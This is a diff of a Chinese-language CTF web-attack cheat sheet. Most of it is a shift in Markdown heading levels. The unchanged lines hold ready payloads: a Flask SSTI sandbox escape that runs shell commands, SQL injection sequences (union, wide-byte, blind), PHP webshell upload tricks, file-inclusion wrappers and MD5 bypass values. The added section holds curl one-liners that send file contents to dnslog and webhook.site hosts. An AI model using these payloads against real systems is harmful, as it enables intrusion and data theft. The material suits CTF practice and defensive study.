@@ -3,9 +3,9 @@
 
 
 # Python的Web框架Flask的SSTI模板注入+沙箱逃逸
-## 内置函数
+### 内置函数
 
-### 查看内置函数组
+#### 查看内置函数组
 
 ```python
 ().__class__.__base__.__subclasses__()
@@ -27,7 +27,7 @@ getattr(().__class__.__bases__[0], "__subclasses__")()
 
 找到函数`<class 'os._wrap_close'>`位于第`137`位
 
-### 调用内置函数
+#### 调用内置函数
 
 ```python
 ().__class__.__base__.__subclasses__()[137].__init__.__globals__.popen("ls"+" "+"/").read()
@@ -71,51 +71,51 @@ exec("error=\"abc\";raise Exception("abc")")
 
 # SQL注入
 
-## 常规注入
+### 常规注入
 
-### 确认注释类型
+#### 确认注释类型
 
 - #
 - --
 - --+
 
-### 测试漏洞存在
+#### 测试漏洞存在
 
 ```sql
 ' or true#
 ```
 
-### 测试字段数量
+#### 测试字段数量
 
 ```sql
 ' order by 3#
 ```
 
-### 查询数据库名称
+#### 查询数据库名称
 
 ```sql
 ' union select 1,2,table_schema from information_schema.tables#
 ```
 
-### 查询数据表名称
+#### 查询数据表名称
 
 ```sql
 ' union select 1,2,table_name from information_schema.tables where table_schema='news'#
 ```
 
-### 查询字段名称
+#### 查询字段名称
 
 ```sql
 ' union select 1,2,column_name from information_schema.columns where table_schema='news' and table_name='secret_table'#
 ```
 
-### 查询字段内容
+#### 查询字段内容
 
 ```sql
 ' union select all 1,2,fl4g from secret_table#
 ```
 
-### 联表查询字段
+#### 联表查询字段
 
 ```sql
 ' union select all null,null,null from users #
@@ -123,9 +123,9 @@ exec("error=\"abc\";raise Exception("abc")")
 
 
 
-## 函数注入
+### 函数注入
 
-### 确认注释类型
+#### 确认注释类型
 
 - #
 
@@ -133,37 +133,37 @@ exec("error=\"abc\";raise Exception("abc")")
 
 - --+
 
-### 测试漏洞存在
+#### 测试漏洞存在
 
 ```sql
 ' or true --+
 ```
 
-### 测试字段数量
+#### 测试字段数量
 
 ```sql
 ' order by 3 --+
 ```
 
-### 查询数据库名称
+#### 查询数据库名称
 
 ```sql
 ' union select 1,2,database() --+
 ```
 
-### 查询数据表名称
+#### 查询数据表名称
 
 ```sql
 ' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db' --+
 ```
 
-### 查询字段名称
+#### 查询字段名称
 
 ```sql
 ' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='test_db' --+
 ```
 
-### 查询字段内容
+#### 查询字段内容
 
 ```sql
 ' union select 1,2,flag from test_tb --+
@@ -171,9 +171,9 @@ exec("error=\"abc\";raise Exception("abc")")
 
 
 
-## 宽体注入
+### 宽体注入
 
-### 确认注释类型
+#### 确认注释类型
 
 - #
 
@@ -181,43 +181,43 @@ exec("error=\"abc\";raise Exception("abc")")
 
 - --+
 
-### 测试漏洞存在
+#### 测试漏洞存在
 
 ```sql
 %81' or true#
 ```
 
-### 测试字段数量
+#### 测试字段数量
 
 ```sql
 %81' order by 3#
 ```
 
-### 查询数据库名称
+#### 查询数据库名称
 
 ```sql
 %81' union select 1,2,table_schema from information_schema.tables#
 ```
 
-### 查询数据表名称
+#### 查询数据表名称
 
 ```sql
 %81' union select 1,2,table_name from information_schema.tables where table_schema='news'#
 ```
 
-### 查询字段名称
+#### 查询字段名称
 
 ```sql
 %81' union select 1,2,column_name from information_schema.columns where table_schema='news' and table_name='secret_table'#
 ```
 
-### 查询字段内容
+#### 查询字段内容
 
 ```sql
 %81' union select all 1,2,fl4g from secret_table#
 ```
 
-### 联表查询字段
+#### 联表查询字段
 
 ```sql
 %81' union select all null,null,null from users #
@@ -225,9 +225,9 @@ exec("error=\"abc\";raise Exception("abc")")
 
 
 
-## 布尔盲注
+### 布尔盲注
 
-### 确认注释类型
+#### 确认注释类型
 
 - #
 
@@ -235,43 +235,43 @@ exec("error=\"abc\";raise Exception("abc")")
 
 - --+
 
-### 测试漏洞存在
+#### 测试漏洞存在
 
 ```sql
 ' or true#
 ```
 
-### 测试字段数量
+#### 测试字段数量
 
 ```sql
 ' order by 3#
 ```
 
-### 查询数据库名称
+#### 查询数据库名称
 
 ```sql
 ' union select 1,2,table_schema from information_schema.tables#
 ```
 
-### 查询数据表名称
+#### 查询数据表名称
 
 ```sql
 ' union select 1,2,table_name from information_schema.tables where table_schema='news'#
 ```
 
-### 查询字段名称
+#### 查询字段名称
 
 ```sql
 ' union select 1,2,column_name from information_schema.columns where table_schema='news' and table_name='secret_table'#
 ```
 
-### 查询字段内容
+#### 查询字段内容
 
 ```sql
 ' union select all 1,2,fl4g from secret_table#
 ```
 
-### 测试盲注函数
+#### 测试盲注函数
 ```sql
 ' union select all null,null,null from users where length(null) >= 10 #
 ```
@@ -284,7 +284,7 @@ exec("error=\"abc\";raise Exception("abc")")
 ' union select all null,null,null from users where substr(null, 0, 4) == "flag" and substr(null, 4, 1) == "{" #
 ```
 
-### 编写盲注脚本
+#### 编写盲注脚本
 
 ```python
 import time
@@ -348,21 +348,21 @@ if __name__ == "__main__":
 
 # 文件上传漏洞
 
-## 前端校验
+### 前端校验
 
-### 编写php文件
+#### 编写php文件
 
 ```php
 <?=`ls`;
 ```
 
-### 合成payload文件
+#### 合成payload文件
 
 ```shell
 copy /b png.png + php.php payload.png
 ```
 
-### BS抓包改后缀
+#### BS抓包改后缀
 
 ```shell
 png -> php
@@ -370,25 +370,25 @@ png -> php
 
 
 
-## 后端校验
+### 后端校验
 
-### phtml
+#### phtml
 
-#### 编写phtml文件
+##### 编写phtml文件
 
 ```
 <?=`ls`;
 ```
 
-### php
+#### php
 
-#### 编写php文件
+##### 编写php文件
 
 ```php
 <?=`ls`;
 ```
 
-#### 合成payload文件
+##### 合成payload文件
 
 ```shell
 copy /b png.png + php.php payload.png
@@ -396,49 +396,49 @@ copy /b png.png + php.php payload.png
 
 
 
-## 前后端校验
+### 前后端校验
 
-### phtml
+#### phtml
 
-#### 编写phtml文件
+##### 编写phtml文件
 
 ```
 <?=`ls`;
 ```
 
-#### 合成payload文件
+##### 合成payload文件
 
 ```shell
 copy /b png.png + phtml.phtml payload.png
 ```
 
-#### BS抓包改后缀
+##### BS抓包改后缀
 
 ```shell
 png -> phtml
 ```
 
-### php
+#### php
 
-#### 编写php文件
+##### 编写php文件
 
 ```php
 <?=`ls`;
 ```
 
-#### 合成payload文件
+##### 合成payload文件
 
 ```shell
 copy /b png.png + php.php payload.png
 ```
 
-#### 合成payload文件
+##### 合成payload文件
 
 ```shell
 copy /b png.png + php.php payload.png
 ```
 
-#### BS抓包改后缀
+##### BS抓包改后缀
 
 ```shell
 png -> php
@@ -448,9 +448,9 @@ png -> php
 
 # 文件包含漏洞
 
-## file协议
+### file协议
 
-### 本地穿梭
+#### 本地穿梭
 
 ```shell
 ?include=file://[文件的绝对路径和文件名]
@@ -458,9 +458,9 @@ png -> php
 
 
 
-## php协议
+### php协议
 
-### 文件内容读取
+#### 文件内容读取
 
 ```shell
 ?include=php://filter/convert.base64-encode/resource=[文件路径]
@@ -468,9 +468,9 @@ png -> php
 
 
 
-## ZIP协议
+### ZIP协议
 
-### 压缩文件内容读取
+#### 压缩文件内容读取
 
 ```shell
 ?include=zip://[压缩包绝对路径]#[压缩包内文件]
@@ -478,15 +478,15 @@ png -> php
 
 
 
-## data协议
+### data协议
 
-### 执行命令
+#### 执行命令
 
 ```shell
 ?include=data://text/plain,<?php phpinfo();?>
 ```
 
-### 伪造文本
+#### 伪造文本
 
 ```shell
 ?include=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
@@ -495,25 +495,25 @@ png -> php
 
 # MD5碰撞
 
-## 弱碰撞
+### 弱碰撞
 
-### 0e绕过
+#### 0e绕过
 
-#### 适用
+##### 适用
 
 ```shell
 a == md5(a)
 ```
 
-#### 例子
+##### 例子
 
 ```shell
 0e215962017
 ```
 
-### 长字符绕过
+#### 长字符绕过
 
-#### 适用
+##### 适用
 
 ```shell
 a != b && md5(a) == md5(b)
@@ -523,7 +523,7 @@ a != b && md5(a) == md5(b)
 a !== b && md5(a) == md5(b)
 ```
 
-#### 例子
+##### 例子
 
 ```shell
 QNKCDZO
@@ -538,9 +538,9 @@ s214587387a
 
 
 
-### 数组绕过
+#### 数组绕过
 
-#### 适用
+##### 适用
 
 ```shell
 a != b && md5(a) == md5(b)
@@ -558,7 +558,7 @@ a != b && md5(a) === md5(b)
 a !== b && md5(a) === md5(b)
 ```
 
-#### 例子
+##### 例子
 
 ```shell
 a[] = 0
@@ -567,15 +567,15 @@ b[] = 1
 
 
 
-### 单md5特定
+#### 单md5特定
 
-#### 适用
+##### 适用
 
 ```shell
 md5(x)==y
 ```
 
-#### 脚本
+##### 脚本
 
 ```python
 import hashlib, random, string
@@ -593,15 +593,15 @@ while 1:
 
 
 
-### 双md5特定
+#### 双md5特定
 
-#### 适用
+##### 适用
 
 ```shell
 md5(md5(x))==y
 ```
 
-#### 脚本
+##### 脚本
 
 ```python
 import hashlib, random, string
@@ -619,11 +619,11 @@ while 1:
 
 
 
-## 强碰撞
+### 强碰撞
 
-### 碰撞绕过
+#### 碰撞绕过
 
-#### 适用
+##### 适用
 
 ```shell
 (string)a != (string)b && md5(a) === md5(b)
@@ -633,7 +633,7 @@ while 1:
 (string)a !== (string)b && md5(a) === md5(b)
 ```
 
-#### 例子
+##### 例子
 
 ```shell
 psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2
@@ -657,33 +657,33 @@ M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%A
 
 # Http请求
 
-## 从某浏览器
+### 从某浏览器
 
-### 例子
+#### 例子
 
 ```shell
 User-Agent WLLM
 ```
 
-## 从某地址
+### 从某地址
 
-### 例子
+#### 例子
 
 ```shell
 X-Forwarded-For 127.0.0.1
 ```
 
-## 从某网址
+### 从某网址
 
-### 例子
+#### 例子
 
 ```shell
 Referer ?CTF
 ```
 
-## 从某事件
+### 从某事件
 
-### 例子
+#### 例子
 
 ```shell
 Data Tue, 27 Aug 2024 05:00:00 GMT
@@ -693,7 +693,7 @@ Data Tue, 27 Aug 2024 05:00:00 GMT
 
 # Url编码
 
-## 规则
+### 规则
 
 ```python
 '%' + hex(ord(chr))
@@ -705,7 +705,7 @@ Data Tue, 27 Aug 2024 05:00:00 GMT
 - 转16进制
 - 去首"0x"然后首补'%'
 
-## 公式
+### 公式
 
 ```python
 def urlEncode(encodeStr: str) -> str:
@@ -727,7 +727,7 @@ def urlDecode(decodeStr: str) -> str:
 
 # 爬虫
 
-## 脚本
+### 脚本
 
 ```python
 import requests
@@ -748,7 +748,7 @@ def postBySession(uri: str, data: dict = None, params: dict = None) -> str: retu
 
 # MD5
 
-## 脚本
+### 脚本
 
 ```python
 import hashlib
@@ -759,5 +759,25 @@ def md5(content: str)->str:
     return hex.hexdigest()
 
 
+```
+
+
+
+# 反弹Shell
+
+### Dnslog
+
+#### 公式
+
+```shell
+curl `cat /f*`.ociqfw.dnslog.cn
+```
+
+### Webhook
+
+#### 公式
+
+```shell
+curl https://webhook.site/#!/view/f9280e85-7baa-4f28-8689-4d20879c0792/`cat /f*`
 ```
 
